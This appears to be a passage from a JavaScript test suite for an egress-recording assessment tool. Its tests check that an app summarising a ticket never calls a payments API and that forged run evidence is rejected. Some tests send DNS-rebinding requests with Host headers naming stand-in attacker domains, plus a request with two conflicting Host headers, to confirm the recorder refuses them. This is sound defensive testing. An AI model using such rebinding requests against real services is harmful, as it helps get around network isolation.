    { id: 'NO-CHARGE', title: 'Summarizing a ticket never calls the payments API', category: 'tool-misuse', severity: 'high', actorId: 'ops', method: 'GET', path: '/agent/summarize', evidenceRequirement: 'backend',
      assertions: [{ kind: 'status.equals', expected: 200 }], effects: [{ kind: 'effect.none', select: { source: 'http-egress', name: PAY, operation: 'send' } }] },
  ] });
const env = { SCOPEHAVEN_TARGET_OPS: 'synthetic-ops-token' };
// The profile's sink binds its port when the run starts. Only a start that lost the port to another process
// (EADDRINUSE) is retried on a fresh port; a window that fails for any other reason stands.
const profileRun = (t, sends, { shape = p => p, runEnv = env, build = buildObservers, attempts = [] } = {}) => onFreePorts(1, async port => {
  const p = shape(profile(await app(t, port, { sends }), port)), watch = watchingBinds(build);
  validateTargetFile({ schemaVersion: 1, targets: [p] });
  attempts.push(port);
  return { p, run: await runHttpAssessment(p, { env: runEnv, observerFactory: watch.factory }), lostBind: watch.state.lostBind };
}, result => result.lostBind);
const inUse = () => Object.assign(new Error('listen EADDRINUSE'), { code: 'EADDRINUSE' });
// A product failure (every collect throws) and a sink whose first start loses its port.
const collectFails = (configs, options) => buildObservers(configs, options).map(o => Object.assign(o, { collect: async () => { throw new Error('synthetic collect failure'); } }));
const firstStartLoses = () => { let first = true; return (configs, options) => buildObservers(configs, options).map(o => { const start = o.start.bind(o); o.start = async () => { if (first) { first = false; throw inUse(); } return start(); }; return o; }); };

// The checks run as bob; ops is only the sink's witness actor, with no check of its own.
const asBob = p => ({ ...p, actors: { ...p.actors, bob: { principalId: 'bob', credentialEnv: 'SCOPEHAVEN_TARGET_BOB', identityValue: 'bob' } },
  checks: p.checks.map(c => ({ ...c, actorId: 'bob', assertions: c.assertions.map(a => a.pointer === '/user' ? { ...a, expected: 'bob' } : a) })) });
test('a sink witness actor with no check of its own is a used actor: its credential is required, and the witness carries it', async t => {
  const bothEnv = { ...env, SCOPEHAVEN_TARGET_BOB: 'synthetic-bob-token' };
  const { p, run } = await profileRun(t, false, { shape: asBob, runEnv: bothEnv });
  const r = run.results.find(x => x.id === 'NO-CHARGE'), w = r.trace[1].data.windows[0];
  assert.deepEqual([r.status, w.coverage, w.reason], ['pass', 'complete', null], 'the witness request was signed in as ops, so the app sent the witness');
  assert.deepEqual(credentialReadiness(p, { SCOPEHAVEN_TARGET_BOB: 'synthetic-bob-token' }), { ready: false, missingCredentialRefs: ['SCOPEHAVEN_TARGET_OPS'] });
  assert.equal(credentialReadiness(p, bothEnv).ready, true);
});

test('a profile run is retried only when a sink lost its port; a window that fails for another reason stands', async t => {
  const once = [];
  const { run } = await profileRun(t, false, { build: collectFails, attempts: once });
  assert.deepEqual([run.results.find(x => x.id === 'NO-CHARGE').trace[1].data.windows[0].coverage, once.length], ['failed', 1]);
  const twice = [];
  const retried = await profileRun(t, false, { build: firstStartLoses(), attempts: twice });
  assert.deepEqual([retried.run.results.find(x => x.id === 'NO-CHARGE').status, twice.length], ['pass', 2]);
});

test('egress in a profile: a forbidden outbound call fails the check; a clean app passes with backend observed (end to end, suite-valid)', async t => {
  for (const [sends, status] of [[true, 'fail'], [false, 'pass']]) {
    const { p, run } = await profileRun(t, sends);
    const r = run.results.find(x => x.id === 'NO-CHARGE'), w = r.trace[1].data.windows[0];
    assert.deepEqual([r.status, r.backendEvidence, w.coverage, w.lineage.observer, w.lineage.independence], [status, sends ? 'observed' : 'observed', 'complete', 'http-egress-recorder', 'request-path'], JSON.stringify({ reason: w.reason, a: r.assertions }));
    assert.equal(r.assertions.find(a => a.name === 'HTTP status matches contract').status, 'pass', 'the response alone looks fine either way');
    validateHttpRunEvidence(run, { expectedSuite: createRegistry({ profiles: [p], env }).exportSuite(p.id) });
    assert.ok(run.limitations.some(l => l.startsWith('Egress recorders (sink: proxy routing')));
    // The addressing limit, pinned.
    assert.ok(run.limitations.find(l => l.startsWith('Egress recorders (sink:')).includes('A proxy request whose Host header names another host than its URL, or that addresses an undeclared IP literal, leaves the window partial'));
    if (!sends) continue;
    // Relabelled as another request-path source (same lineage), resealed: only the observer-type binding refuses it.
    const forged = structuredClone(run), fr = forged.results.find(x => x.id === 'NO-CHARGE'), fw = fr.trace[1].data.windows[0];
    fw.source = 'hold-proxy'; for (const e of fw.events) e.source = 'hold-proxy';
    fr.evidenceDigest = digest({ evidence: fr.trace[0].data, effects: fr.trace[1].data, assertions: fr.assertions });
    assert.throws(() => validateHttpRunEvidence(forged), /invalid-run-evidence/);
  }
});

test('egress profiles: refused before any request when the configuration is unsound', () => {
  const reject = (edit, pattern) => { const p = profile('http://127.0.0.1:4000', 47000); edit(p.observers[0]); assert.throws(() => validateTargetFile({ schemaVersion: 1, targets: [p] }), pattern); };
  reject(o => { o.witness.actorId = 'ghost'; }, /declared actor/);
  reject(o => { delete o.witness; }, /"routing" and "witness" go together/);
  reject(o => { o.upstream = 'http://api.pay.example'; }, /an egress-recorder observer is/);
});

// A base-url request whose Host names anything but the sink is a browser's (DNS rebinding):
// refused, never recorded or forwarded as the app's send. Proxy-form requests name their destination in Host and are unaffected.
test('a base-url request naming another Host is refused like a browser and never becomes a send; the sink\'s own names pass', async t => {
  const o = await recorder(t, { routing: 'base-url', routes: [{ prefix: '/pay/', host: PAY }, { prefix: '/w/', host: WITNESS }] });
  const via = async (target, headers) => {
    const from = await o.mark();
    const status = await send(o, { method: 'GET', target, headers });
    o.markWitnessRequest(from);
    await send(o, { method: 'GET', target: `/w/ping?scopehaven_witness=${from.witnessNonce}` });
    return { status, w: await collectWindow(o, from, await o.mark()) };
  };
  for (const host of [`rebind.attacker.example:${o.port}`, `127.0.0.1.attacker.example:${o.port}`, `127.0.0.1:${o.port + 1}`, 'localhost', `host.docker.internal.attacker.example:${o.port}`]) {
    const { status, w } = await via('/pay/v1/customers', { host });
    assert.equal(status, 403, host);
    assert.deepEqual(w.events, [], host);
    assert.match(w.reason, /egress-browser-request/, host);
  }
  for (const host of [`127.0.0.1:${o.port}`, `localhost:${o.port}`, `LOCALHOST:${o.port}`, `host.docker.internal:${o.port}`]) {
    const { status, w } = await via('/pay/v1/customers', { host });
    assert.notEqual(status, 403, host);
    assert.deepEqual([w.coverage, w.events.map(e => [e.name, e.resource])], ['complete', [[PAY, 'GET *']]], host);
  }
  // Two Host headers are never read as one of them.
  const raw = text => new Promise(resolve => { const c = connect(o.port, '127.0.0.1', () => c.end(text)); const out = []; c.on('data', d => out.push(d)); c.on('error', () => {}); c.on('close', () => resolve(Buffer.concat(out).toString('latin1').split('\r\n')[0])); });
  assert.equal(await raw(`GET /pay/v1/customers HTTP/1.1\r\nHost: 127.0.0.1:${o.port}\r\nHost: rebind.attacker.example:${o.port}\r\nConnection: close\r\n\r\n`), 'HTTP/1.1 403 Forbidden');
  // An HTTP/1.0 request without a Host names no other host (a browser always sends one): recorded as the app's send.
  const from = await o.mark();
  assert.notEqual(await raw('GET /pay/v1/customers HTTP/1.0\r\n\r\n'), 'HTTP/1.1 403 Forbidden');
  o.markWitnessRequest(from);
  await send(o, { method: 'GET', target: `/w/ping?scopehaven_witness=${from.witnessNonce}` });
  assert.deepEqual((await collectWindow(o, from, await o.mark())).events.map(e => [e.name, e.resource]), [[PAY, 'GET *']]);
});

// A refused (rebound) request is a window-wide problem, never a scoped late entry (the units
// late-record binding and suspend settlement read) and never a send; the same late request naming the sink is a scoped entry.
test('in a scoped check window a rebound late request is window-wide, never a late entry or a send; the sink\'s own is a scoped entry', async t => {
  const o = await recorder(t, { routing: 'base-url', routes: [{ prefix: '/pay/', host: PAY }, { prefix: '/w/', host: WITNESS }] });
  const late = async host => {
    const from = await o.mark();
    o.markWitnessRequest(from);
    await send(o, { method: 'GET', target: `/w/ping?scopehaven_witness=${from.witnessNonce}` });
    await send(o, { target: '/pay/v1/refunds', body: '{}', headers: { host } }); // after the witness request was sent
    return collectWindow(o, from, await o.mark(), { scoped: true });
  };
  const own = await late(`127.0.0.1:${o.port}`);
  assert.deepEqual(own.scoped?.map(e => [e.name, e.resource, e.codes]), [[PAY, 'POST /v1/refunds', ['egress-request-after-witness-request']]], JSON.stringify(own.reason));
  const rebound = await late(`rebind.attacker.example:${o.port}`);
  assert.deepEqual([rebound.scoped, rebound.events, rebound.coverage], [undefined, [], 'partial']);
  assert.match(rebound.reason, /egress-browser-request/);
});
